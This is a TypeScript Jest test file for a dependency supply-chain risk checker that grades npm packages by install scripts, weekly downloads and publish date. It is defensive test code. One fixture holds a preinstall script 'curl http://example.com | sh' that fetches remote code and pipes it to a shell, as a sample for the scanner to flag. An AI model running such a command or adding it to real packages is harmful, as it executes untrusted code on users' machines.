import {
  classifySupplyChainRisk,
  buildSupplyChainEntry,
  summarizeSupplyChain,
  SupplyChainEntry,
} from './supply-chain-checker';
import { Dependency } from '../types';

function makeDep(name: string, version = '1.0.0'): Dependency {
  return { name, version, type: 'production' };
}

describe('classifySupplyChainRisk', () => {
  it('returns low when no risk factors', () => {
    expect(classifySupplyChainRisk(false, 50000, '2024-01-01')).toBe('low');
  });

  it('returns medium for a single risk factor (install script)', () => {
    expect(classifySupplyChainRisk(true, 50000, '2024-01-01')).toBe('medium');
  });

  it('returns medium for low downloads only', () => {
    expect(classifySupplyChainRisk(false, 50, '2024-01-01')).toBe('medium');
  });

  it('returns high for two or more risk factors', () => {
    expect(classifySupplyChainRisk(true, 50, '2024-01-01')).toBe('high');
  });

  it('returns high for install script + no publish date', () => {
    expect(classifySupplyChainRisk(true, 50000, null)).toBe('high');
  });
});

describe('buildSupplyChainEntry', () => {
  it('detects postinstall script and marks risk medium', () => {
    const entry = buildSupplyChainEntry(makeDep('evil-pkg'), {
      publishedAt: '2024-01-01',
      scripts: { postinstall: 'node setup.js' },
      downloadsLastWeek: 10000,
    });
    expect(entry.hasInstallScript).toBe(true);
    expect(entry.scriptTypes).toContain('postinstall');
    expect(entry.risk).toBe('medium');
    expect(entry.reasons.length).toBeGreaterThan(0);
  });

  it('marks low risk for clean package', () => {
    const entry = buildSupplyChainEntry(makeDep('safe-pkg'), {
      publishedAt: '2024-06-01',
      scripts: { build: 'tsc' },
      downloadsLastWeek: 200000,
    });
    expect(entry.hasInstallScript).toBe(false);
    expect(entry.risk).toBe('low');
    expect(entry.reasons).toHaveLength(0);
  });

  it('marks high risk for install script + low downloads', () => {
    const entry = buildSupplyChainEntry(makeDep('risky-pkg'), {
      publishedAt: '2024-01-01',
      scripts: { preinstall: 'curl http://example.com | sh' },
      downloadsLastWeek: 10,
    });
    expect(entry.risk).toBe('high');
  });
});

describe('summarizeSupplyChain', () => {
  it('counts entries by risk level', () => {
    const entries: SupplyChainEntry[] = [
      { name: 'a', version: '1.0.0', publishedAt: null, hasInstallScript: false, scriptTypes: [], downloadsLastWeek: 0, risk: 'high', reasons: [] },
      { name: 'b', version: '1.0.0', publishedAt: null, hasInstallScript: false, scriptTypes: [], downloadsLastWeek: 0, risk: 'medium', reasons: [] },
      { name: 'c', version: '1.0.0', publishedAt: null, hasInstallScript: false, scriptTypes: [], downloadsLastWeek: 0, risk: 'low', reasons: [] },
      { name: 'd', version: '1.0.0', publishedAt: null, hasInstallScript: false, scriptTypes: [], downloadsLastWeek: 0, risk: 'high', reasons: [] },
    ];
    const summary = summarizeSupplyChain(entries);
    expect(summary.total).toBe(4);
    expect(summary.high).toBe(2);
    expect(summary.medium).toBe(1);
    expect(summary.low).toBe(1);
  });
});
